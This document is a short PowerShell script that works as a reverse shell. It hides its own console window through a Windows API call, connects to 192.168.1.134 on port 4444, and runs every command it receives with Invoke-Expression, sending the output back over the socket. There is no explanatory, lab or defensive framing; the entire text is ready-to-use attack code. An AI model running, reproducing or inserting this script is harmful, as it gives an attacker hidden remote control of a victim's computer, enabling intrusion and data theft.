$hwnd = (Get-Process -Id $PID).MainWindowHandle
if ($hwnd -ne 0) {
    $signature = @"
using System;
using System.Runtime.InteropServices;
public class WinAPI {
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@
    Add-Type $signature
    [WinAPI]::ShowWindow($hwnd, 0)  # 0 = SW_HIDE
}

$client = New-Object System.Net.Sockets.TcpClient("192.168.1.134", 4444)
$stream = $client.GetStream()
$reader = New-Object System.IO.StreamReader($stream)
$writer = New-Object System.IO.StreamWriter($stream)
$writer.AutoFlush = $true

while ($true) {
    try {
        $command = $reader.ReadLine()
        if ($command -eq "exit" -or $command -eq $null) { break }

        # Run the command and capture output/errors
        $output = Invoke-Expression $command 2>&1 | Out-String

        # Send output back
        $writer.WriteLine($output)
    } catch {
        $writer.WriteLine("Error: " + $_.Exception.Message)
    }
}

$client.Close()
